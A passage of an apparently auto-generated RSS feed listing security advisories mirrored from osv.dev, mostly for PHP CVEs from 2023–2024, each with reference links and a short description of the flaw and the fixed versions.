href='https://www.debian.org/security/2022/dsa-5267'>https://www.debian.org/security/2022/dsa-5267</a></li><li>- <a target='_blank' href='https://www.debian.org/security/2022/dsa-5269'>https://www.debian.org/security/2022/dsa-5269</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20230203-0001/'>https://security.netapp.com/advisory/ntap-20230203-0001/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>The Keccak XKCP SHA-3 reference implementation before fdc6fef has an integer overflow and resultant buffer overflow that allows attackers to execute arbitrary code or eliminate expected cryptographic properties. This occurs in the sponge function interface.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2023-0567: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2023-0567</link>
                    <pubDate>2025-01-14T19:21:05.812Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2023-0567'>https://osv.dev/vulnerability/BIT-php-min-2023-0567</a><br>
                            <b>Published:</b> 2025-01-14T19:21:05.812Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.php.net/bug.php?id=81744'>https://bugs.php.net/bug.php?id=81744</a></li><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-7fj2-8x79-rjf4'>https://github.com/php/php-src/security/advisories/GHSA-7fj2-8x79-rjf4</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20230331-0008/'>https://security.netapp.com/advisory/ntap-20230331-0008/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP 8.0.X before 8.0.28, 8.1.X before 8.1.16 and 8.2.X before 8.2.3, password_verify() function may accept some invalid Blowfish hashes as valid. If such invalid hash ever ends up in the password database, it may lead to an application allowing any password for this entry as valid. 
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2023-0662: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2023-0662</link>
                    <pubDate>2025-01-14T19:20:52.604Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2023-0662'>https://osv.dev/vulnerability/BIT-php-min-2023-0662</a><br>
                            <b>Published:</b> 2025-01-14T19:20:52.604Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-54hq-v5wp-fqgv'>https://github.com/php/php-src/security/advisories/GHSA-54hq-v5wp-fqgv</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20230517-0001/'>https://security.netapp.com/advisory/ntap-20230517-0001/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP 8.0.X before 8.0.28, 8.1.X before 8.1.16 and 8.2.X before 8.2.3, excessive number of parts in HTTP form upload can cause high resource consumption and excessive number of log entries. This can cause denial of service on the affected server by exhausting CPU resources or disk space. 
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2023-3247: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2023-3247</link>
                    <pubDate>2025-01-14T19:20:45.508Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2023-3247'>https://osv.dev/vulnerability/BIT-php-min-2023-3247</a><br>
                            <b>Published:</b> 2025-01-14T19:20:45.508Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-76gg-c692-v2mw'>https://github.com/php/php-src/security/advisories/GHSA-76gg-c692-v2mw</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP versions 8.0.* before 8.0.29, 8.1.* before 8.1.20, 8.2.* before 8.2.7 when using SOAP HTTP Digest Authentication, random value generator was not checked for failure, and was using narrower range of values than it should have. In case of random generator failure, it could lead to a disclosure of 31 bits of uninitialized memory from the client to the server, and it also made easier to a malicious server to guess the client&#x27;s nonce. 
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2023-3823: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2023-3823</link>
                    <pubDate>2025-01-14T19:20:38.598Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2023-3823'>https://osv.dev/vulnerability/BIT-php-min-2023-3823</a><br>
                            <b>Published:</b> 2025-01-14T19:20:38.598Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-3qrf-m4j2-pcrr'>https://github.com/php/php-src/security/advisories/GHSA-3qrf-m4j2-pcrr</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2023/09/msg00002.html'>https://lists.debian.org/debian-lts-announce/2023/09/msg00002.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/7NBF77WN6DTVTY2RE73IGPYD6M4PIAWA/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/7NBF77WN6DTVTY2RE73IGPYD6M4PIAWA/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20230825-0001/'>https://security.netapp.com/advisory/ntap-20230825-0001/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP versions 8.0.* before 8.0.30, 8.1.* before 8.1.22, and 8.2.* before 8.2.8 various XML functions rely on libxml global state to track configuration variables, like whether external entities are loaded. This state is assumed to be unchanged unless the user explicitly changes it by calling appropriate function. However, since the state is process-global, other modules - such as ImageMagick - may also use this library within the same process, and change that global state for their internal purposes, and leave it in a state where external entities loading is enabled. This can lead to the situation where external XML is parsed with external entities loaded, which can lead to disclosure of any local files accessible to PHP. This vulnerable state may persist in the same process across many requests, until the process is shut down. 
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2023-3824: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2023-3824</link>
                    <pubDate>2025-01-14T19:20:33.095Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2023-3824'>https://osv.dev/vulnerability/BIT-php-min-2023-3824</a><br>
                            <b>Published:</b> 2025-01-14T19:20:33.095Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-jqcx-ccgc-xwhv'>https://github.com/php/php-src/security/advisories/GHSA-jqcx-ccgc-xwhv</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2023/09/msg00002.html'>https://lists.debian.org/debian-lts-announce/2023/09/msg00002.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/7NBF77WN6DTVTY2RE73IGPYD6M4PIAWA/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/7NBF77WN6DTVTY2RE73IGPYD6M4PIAWA/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20230825-0001/'>https://security.netapp.com/advisory/ntap-20230825-0001/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP version 8.0.* before 8.0.30,  8.1.* before 8.1.22, and 8.2.* before 8.2.8, when loading phar file, while reading PHAR directory entries, insufficient length checking may lead to a stack buffer overflow, leading potentially to memory corruption or RCE. 
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2024-11233: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2024-11233</link>
                    <pubDate>2025-01-14T19:20:25.916Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2024-11233'>https://osv.dev/vulnerability/BIT-php-min-2024-11233</a><br>
                            <b>Published:</b> 2025-01-14T19:20:25.916Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-r977-prxv-hc43'>https://github.com/php/php-src/security/advisories/GHSA-r977-prxv-hc43</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP versions 8.1.* before 8.1.31, 8.2.* before 8.2.26, 8.3.* before 8.3.14, due to an error in convert.quoted-printable-decode filter certain data can lead to buffer overread by one byte, which can in certain circumstances lead to crashes or disclose content of other memory areas.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2024-11234: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2024-11234</link>
                    <pubDate>2025-01-14T19:20:19.309Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2024-11234'>https://osv.dev/vulnerability/BIT-php-min-2024-11234</a><br>
                            <b>Published:</b> 2025-01-14T19:20:19.309Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-c5f2-jwm7-mmq2'>https://github.com/php/php-src/security/advisories/GHSA-c5f2-jwm7-mmq2</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP versions 8.1.* before 8.1.31, 8.2.* before 8.2.26, 8.3.* before 8.3.14, when using streams with configured proxy and &quot;request_fulluri&quot; option, the URI is not properly sanitized which can lead to HTTP request smuggling and allow the attacker to use the proxy to perform arbitrary HTTP requests originating from the server, thus potentially gaining access to resources not normally available to the external user.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2024-11236: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2024-11236</link>
                    <pubDate>2025-01-14T19:20:14.001Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2024-11236'>https://osv.dev/vulnerability/BIT-php-min-2024-11236</a><br>
                            <b>Published:</b> 2025-01-14T19:20:14.001Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-5hqh-c84r-qjcv'>https://github.com/php/php-src/security/advisories/GHSA-5hqh-c84r-qjcv</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP versions 8.1.* before 8.1.31, 8.2.* before 8.2.26, 8.3.* before 8.3.14, uncontrolled long string inputs to ldap_escape() function on 32-bit systems can cause an integer overflow, resulting in an out-of-bounds write.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2024-1874: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2024-1874</link>
                    <pubDate>2025-01-14T19:20:06.807Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2024-1874'>https://osv.dev/vulnerability/BIT-php-min-2024-1874</a><br>
                            <b>Published:</b> 2025-01-14T19:20:06.807Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/04/12/11'>http://www.openwall.com/lists/oss-security/2024/04/12/11</a></li><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/06/07/1'>http://www.openwall.com/lists/oss-security/2024/06/07/1</a></li><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-pc52-254m-w9w7'>https://github.com/php/php-src/security/advisories/GHSA-pc52-254m-w9w7</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PKGTQUOA2NTZ3RXN22CSAUJPIRUYRB4B/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PKGTQUOA2NTZ3RXN22CSAUJPIRUYRB4B/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/W45DBOH56NQDRTOM2DN2LNA2FZIMC3PK/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/W45DBOH56NQDRTOM2DN2LNA2FZIMC3PK/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20240510-0009/'>https://security.netapp.com/advisory/ntap-20240510-0009/</a></li><li>- <a target='_blank' href='https://www.vicarius.io/vsociety/posts/command-injection-vulnerability-in-php-on-windows-systems-cve-2024-1874-and-cve-2024-5585'>https://www.vicarius.io/vsociety/posts/command-injection-vulnerability-in-php-on-windows-systems-cve-2024-1874-and-cve-2024-5585</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP versions 8.1.* before 8.1.28, 8.2.* before 8.2.18, 8.3.* before 8.3.5, when using proc_open() command with array syntax, due to insufficient escaping, if the arguments of the executed command are controlled by a malicious user, the user can supply arguments that would execute arbitrary commands in Windows shell. 
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2024-2408: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2024-2408</link>
                    <pubDate>2025-01-14T19:20:00.603Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2024-2408'>https://osv.dev/vulnerability/BIT-php-min-2024-2408</a><br>
                            <b>Published:</b> 2025-01-14T19:20:00.603Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-hh26-4ppw-5864'>https://github.com/php/php-src/security/advisories/GHSA-hh26-4ppw-5864</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PKGTQUOA2NTZ3RXN22CSAUJPIRUYRB4B/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PKGTQUOA2NTZ3RXN22CSAUJPIRUYRB4B/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/W45DBOH56NQDRTOM2DN2LNA2FZIMC3PK/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/W45DBOH56NQDRTOM2DN2LNA2FZIMC3PK/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>The openssl_private_decrypt function in PHP, when using PKCS1 padding (OPENSSL_PKCS1_PADDING, which is the default), is vulnerable to the Marvin Attack unless it is used with an OpenSSL version that includes the changes from this pull request:  https:&#x2F;&#x2F;github.com&#x2F;openssl&#x2F;openssl&#x2F;pull&#x2F;13817  (rsa_pkcs1_implicit_rejection). These changes are part of OpenSSL 3.2 and have also been backported to stable versions of various Linux distributions, as well as to the PHP builds provided for Windows since the previous release. All distributors and builders should ensure that this version is used to prevent PHP from being vulnerable.PHP Windows builds for the versions 8.1.29, 8.2.20 and 8.3.8 and above include OpenSSL patches that fix the vulnerability.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2024-2756: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2024-2756</link>
                    <pubDate>2025-01-14T19:19:54.823Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2024-2756'>https://osv.dev/vulnerability/BIT-php-min-2024-2756</a><br>
                            <b>Published:</b> 2025-01-14T19:19:54.823Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/04/12/11'>http://www.openwall.com/lists/oss-security/2024/04/12/11</a></li><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-wpj3-hf5j-x4v4'>https://github.com/php/php-src/security/advisories/GHSA-wpj3-hf5j-x4v4</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2024/05/msg00005.html'>https://lists.debian.org/debian-lts-announce/2024/05/msg00005.html</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20240510-0008/'>https://security.netapp.com/advisory/ntap-20240510-0008/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Due to an incomplete fix to  CVE-2022-31629 https:&#x2F;&#x2F;github.com&#x2F;advisories&#x2F;GHSA-c43m-486j-j32p , network and same-site attackers can set a standard insecure cookie in the victim&#x27;s browser which is treated as a __Host- or __Secure- cookie by PHP applications. 
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2024-2757: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2024-2757</link>
                    <pubDate>2025-01-14T19:19:48.312Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2024-2757'>https://osv.dev/vulnerability/BIT-php-min-2024-2757</a><br>
                            <b>Published:</b> 2025-01-14T19:19:48.312Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/04/12/11'>http://www.openwall.com/lists/oss-security/2024/04/12/11</a></li><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-fjp9-9hwx-59fq'>https://github.com/php/php-src/security/advisories/GHSA-fjp9-9hwx-59fq</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20240510-0011/'>https://security.netapp.com/advisory/ntap-20240510-0011/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP 8.3.* before 8.3.5, function mb_encode_mimeheader() runs endlessly for some inputs that contain long strings of non-space characters followed by a space. This could lead to a potential DoS attack if a hostile user sends data to an application that uses this function. 
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2024-3096: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2024-3096</link>
                    <pubDate>2025-01-14T19:19:41.614Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2024-3096'>https://osv.dev/vulnerability/BIT-php-min-2024-3096</a><br>
                            <b>Published:</b> 2025-01-14T19:19:41.614Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/04/12/11'>http://www.openwall.com/lists/oss-security/2024/04/12/11</a></li><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-h746-cjrr-wfmr'>https://github.com/php/php-src/security/advisories/GHSA-h746-cjrr-wfmr</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2024/05/msg00005.html'>https://lists.debian.org/debian-lts-announce/2024/05/msg00005.html</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20240510-0010/'>https://security.netapp.com/advisory/ntap-20240510-0010/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP  version 8.1.* before 8.1.28, 8.2.* before 8.2.18, 8.3.* before 8.3.5, if a password stored with password_hash() starts with a null byte (\x00), testing a blank string as the password via password_verify() will incorrectly return true.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2024-4577: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2024-4577</link>
                    <pubDate>2025-01-14T19:19:35.322Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2024-4577'>https://osv.dev/vulnerability/BIT-php-min-2024-4577</a><br>
                            <b>Published:</b> 2025-01-14T19:19:35.322Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/06/07/1'>http://www.openwall.com/lists/oss-security/2024/06/07/1</a></li><li>- <a target='_blank' href='https://arstechnica.com/security/2024/06/php-vulnerability-allows-attackers-to-run-malicious-code-on-windows-servers/'>https://arstechnica.com/security/2024/06/php-vulnerability-allows-attackers-to-run-malicious-code-on-windows-servers/</a></li><li>- <a target='_blank' href='https://blog.orange.tw/2024/06/cve-2024-4577-yet-another-php-rce.html'>https://blog.orange.tw/2024/06/cve-2024-4577-yet-another-php-rce.html</a></li><li>- <a target='_blank' href='https://cert.be/en/advisory/warning-php-remote-code-execution-patch-immediately'>https://cert.be/en/advisory/warning-php-remote-code-execution-patch-immediately</a></li><li>- <a target='_blank' href='https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/'>https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/</a></li><li>- <a target='_blank' href='https://github.com/11whoami99/CVE-2024-4577'>https://github.com/11whoami99/CVE-2024-4577</a></li><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv'>https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv</a></li><li>- <a target='_blank' href='https://github.com/rapid7/metasploit-framework/pull/19247'>https://github.com/rapid7/metasploit-framework/pull/19247</a></li><li>- <a target='_blank' href='https://github.com/watchtowrlabs/CVE-2024-4577'>https://github.com/watchtowrlabs/CVE-2024-4577</a></li><li>- <a target='_blank' href='https://github.com/xcanwin/CVE-2024-4577-PHP-RCE'>https://github.com/xcanwin/CVE-2024-4577-PHP-RCE</a></li><li>- <a target='_blank' href='https://isc.sans.edu/diary/30994'>https://isc.sans.edu/diary/30994</a></li><li>- <a target='_blank' href='https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/'>https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PKGTQUOA2NTZ3RXN22CSAUJPIRUYRB4B/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PKGTQUOA2NTZ3RXN22CSAUJPIRUYRB4B/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/W45DBOH56NQDRTOM2DN2LNA2FZIMC3PK/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/W45DBOH56NQDRTOM2DN2LNA2FZIMC3PK/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20240621-0008/'>https://security.netapp.com/advisory/ntap-20240621-0008/</a></li><li>- <a target='_blank' href='https://www.imperva.com/blog/imperva-protects-against-critical-php-vulnerability-cve-2024-4577/'>https://www.imperva.com/blog/imperva-protects-against-critical-php-vulnerability-cve-2024-4577/</a></li><li>- <a target='_blank' href='https://www.php.net/ChangeLog-8.php#8.1.29'>https://www.php.net/ChangeLog-8.php#8.1.29</a></li><li>- <a target='_blank' href='https://www.php.net/ChangeLog-8.php#8.2.20'>https://www.php.net/ChangeLog-8.php#8.2.20</a></li><li>- <a target='_blank' href='https://www.php.net/ChangeLog-8.php#8.3.8'>https://www.php.net/ChangeLog-8.php#8.3.8</a></li><li>- <a target='_blank' href='https://www.vicarius.io/vsociety/posts/php-cgi-argument-injection-to-rce-cve-2024-4577'>https://www.vicarius.io/vsociety/posts/php-cgi-argument-injection-to-rce-cve-2024-4577</a></li><li>- <a target='_blank' href='https://www.vicarius.io/vsociety/posts/php-cgi-os-command-injection-vulnerability-cve-2024-4577'>https://www.vicarius.io/vsociety/posts/php-cgi-os-command-injection-vulnerability-cve-2024-4577</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP versions 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8, when using Apache and PHP-CGI on Windows, if the system is set up to use certain code pages, Windows may use &quot;Best-Fit&quot; behavior to replace characters in command line given to Win32 API functions. PHP CGI module may misinterpret those characters as PHP options, which may allow a malicious user to pass options to PHP binary being run, and thus reveal the source code of scripts, run arbitrary PHP code on the server, etc.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2024-5458: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2024-5458</link>
                    <pubDate>2025-01-14T19:19:28.422Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2024-5458'>https://osv.dev/vulnerability/BIT-php-min-2024-5458</a><br>
                            <b>Published:</b> 2025-01-14T19:19:28.422Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/06/07/1'>http://www.openwall.com/lists/oss-security/2024/06/07/1</a></li><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-w8qr-v226-r27w'>https://github.com/php/php-src/security/advisories/GHSA-w8qr-v226-r27w</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2024/06/msg00009.html'>https://lists.debian.org/debian-lts-announce/2024/06/msg00009.html</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PKGTQUOA2NTZ3RXN22CSAUJPIRUYRB4B/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PKGTQUOA2NTZ3RXN22CSAUJPIRUYRB4B/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/W45DBOH56NQDRTOM2DN2LNA2FZIMC3PK/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/W45DBOH56NQDRTOM2DN2LNA2FZIMC3PK/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20240726-0001/'>https://security.netapp.com/advisory/ntap-20240726-0001/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP versions 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8, due to a code logic error, filtering functions such as filter_var when validating URLs (FILTER_VALIDATE_URL) for certain types of URLs the function will result in invalid user information (username + password part of URLs) being treated as valid user information. This may lead to the downstream code accepting invalid URLs as valid and parsing them incorrectly.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2024-5585: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2024-5585</link>
                    <pubDate>2025-01-14T19:19:21.208Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2024-5585'>https://osv.dev/vulnerability/BIT-php-min-2024-5585</a><br>
                            <b>Published:</b> 2025-01-14T19:19:21.208Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='http://www.openwall.com/lists/oss-security/2024/06/07/1'>http://www.openwall.com/lists/oss-security/2024/06/07/1</a></li><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-9fcc-425m-g385'>https://github.com/php/php-src/security/advisories/GHSA-9fcc-425m-g385</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PKGTQUOA2NTZ3RXN22CSAUJPIRUYRB4B/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PKGTQUOA2NTZ3RXN22CSAUJPIRUYRB4B/</a></li><li>- <a target='_blank' href='https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/W45DBOH56NQDRTOM2DN2LNA2FZIMC3PK/'>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/W45DBOH56NQDRTOM2DN2LNA2FZIMC3PK/</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20240726-0002/'>https://security.netapp.com/advisory/ntap-20240726-0002/</a></li><li>- <a target='_blank' href='https://www.vicarius.io/vsociety/posts/command-injection-vulnerability-in-php-on-windows-systems-cve-2024-1874-and-cve-2024-5585'>https://www.vicarius.io/vsociety/posts/command-injection-vulnerability-in-php-on-windows-systems-cve-2024-1874-and-cve-2024-5585</a></li></ul><br>
                            <b>Details:</b> <b></b><br>In PHP versions 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8, the fix for CVE-2024-1874 does not work if the command name includes trailing spaces. Original issue: when using proc_open() command with array syntax, due to insufficient escaping, if the arguments of the executed command are controlled by a malicious user, the user can supply arguments that would execute arbitrary commands in Windows shell.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-php-min-2024-8925: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-php-min-2024-8925</link>
                    <pubDate>2025-01-14T19:19:14.512Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-php-min-2024-8925'>https://osv.dev/vulnerability/BIT-php-min-2024-8925</a><br>
                            <b>Published:</b> 2025-01-14T19:19:14.512Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/php/php-src/security/advisories/GHSA-9pqp-7h25-4f32'>https://github.com/php/php-src/security/advisories/GHSA-9pqp-7h25-4f32</a></li></ul><br>
